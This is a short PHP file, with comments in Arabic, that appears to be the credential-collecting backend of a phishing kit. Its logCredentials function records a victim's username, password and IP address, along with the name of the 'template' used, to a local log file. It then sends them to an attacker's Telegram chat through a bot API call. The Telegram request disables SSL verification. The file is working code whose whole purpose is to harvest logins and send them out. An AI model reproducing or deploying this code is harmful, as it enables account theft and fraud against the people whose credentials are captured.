
<?php
// معالج إرسال البيانات إلى Telegram
function sendToTelegram($botToken, $chatId, $message) {
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
    
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    );
    
    // استخدام cURL لإرسال البيانات
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $httpCode == 200;
    } else {
        // بديل باستخدام file_get_contents
        $options = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($data),
                'timeout' => 10
            ),
        );
        $context = stream_context_create($options);
        $result = @file_get_contents($apiUrl, false, $context);
        return $result !== false;
    }
}

function logCredentials($template, $username, $password, $ip, $botToken, $chatId) {
    // تسجيل البيانات في ملف (اختياري)
    $logData = date('Y-m-d H:i:s') . " - Template: $template, Username: $username, Password: $password, IP: $ip\n";
    file_put_contents('credentials.log', $logData, FILE_APPEND | LOCK_EX);
    
    // إرسال إلى Telegram
    $message = "🚨 <b>تم تلقي بيانات دخول جديدة!</b> 🚨\n\n";
    $message .= "📱 <b>القالب:</b> " . htmlspecialchars($template) . "\n";
    $message .= "👤 <b>اسم المستخدم:</b> " . htmlspecialchars($username) . "\n";
    $message .= "🔒 <b>كلمة المرور:</b> " . htmlspecialchars($password) . "\n";
    $message .= "🌐 <b>عنوان IP:</b> " . htmlspecialchars($ip) . "\n";
    $message .= "⏰ <b>الوقت:</b> " . date('Y-m-d H:i:s');
    
    return sendToTelegram($botToken, $chatId, $message);
}
?>
